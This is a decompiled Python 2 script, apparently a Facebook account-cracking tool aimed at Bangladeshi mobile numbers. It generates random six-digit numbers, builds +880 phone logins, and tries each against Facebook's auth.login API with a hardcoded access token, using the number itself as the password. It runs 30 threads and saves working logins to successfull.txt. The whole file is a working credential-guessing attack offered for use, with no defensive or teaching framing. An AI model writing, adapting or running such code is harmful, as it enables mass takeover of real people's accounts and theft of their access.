# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-05-13 10:57:43.030719
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
os.system('clear')
logo = """


 
\033[1;31m  ____    _       _     _   _    ____  
\033[1;31m / ___|  / \     | |   | | / \  |  _ \ 
 \033[1;31m\___ \ / _ \ _  | |_  | |/ _ \ | | | |
 \033[1;31m ___) / ___ \ |_| | |_| / ___ \| |_| |
 \033[1;31m|____/_/   \_\___/ \___/_/   \_\____/ 
                                       
"""        
print logo
mrm = raw_input('\x1b[1;96m[?] \x1b[1;97mEnter Your User Agent \x1b[1;96m>>>> ')
for n in range(10000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', mrm + ';]')]

def exb():
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = """


 \033[1;34m ____    _       _     _   _    ____  
 \033[1;34m/ ___|  / \     | |   | | / \  |  _ \ 
\033[1;34m \___ \ / _ \ _  | |_  | |/ _ \ | | | |
 \033[1;34m ___) / ___ \ |_| | |_| / ___ \| |_| |
\033[1;34m |____/_/   \_\___/ \___/_/   \_\____/ 
                                       

 
"""        
os.system('clear')



back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    global cpb
    global oks
    os.system('clear')
    print logo
    
    print '\x1b[1;32m GRAMEENPHONE : 017,013  \n ROBI         : 018 \n AIRTEL       : 016  \n BANGLALINK   : 019,014 '
    try:
        c = raw_input(' \n\n\t\x1b[1;32;40mCHOOSE CODE \x1b[1;31;40m =\x1b[1;35;40m ')
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Back ]')
        menu()

    print 47 * '\x1b[1;91m\xe2\x96\x80\x1b[1;92m\xe2\x96\x80'
    xxx = str(len(id))
    psb('\x1b[1;92m[\xe2\x9c\x94] TOTAL NUMBER: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;93m[\xe2\x9c\x93]\x1b[1;93m PLEASE WAIT, PROSESS RUNNING \x1b[0;92mX \x1b[0;95mX...')
    time.sleep(0.5)
    psb('\x1b[1;94m[\xe2\x9c\x93]\x1b[1;94m ON OFF FLIGHT MODE IF NO RESULT')
    time.sleep(0.5)
    psb('\x1b[1;91m[!] TO STOP PROSESSS PRESS CTRL THEN PRESS Z')
    time.sleep(0.5)
    print 47 * '\x1b[1;91m\xe2\x96\x80\x1b[1;92m\xe2\x96\x80'
	
			

    def main(arg):
        user = arg
        try:
            os.mkdir('ni')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + user + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[CHECKPOINT] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[-_-] Process Has Been Completed ....'
    print '[-_-] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[-_-] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('cat .README.md')


if __name__ == '__main__':
    menu()
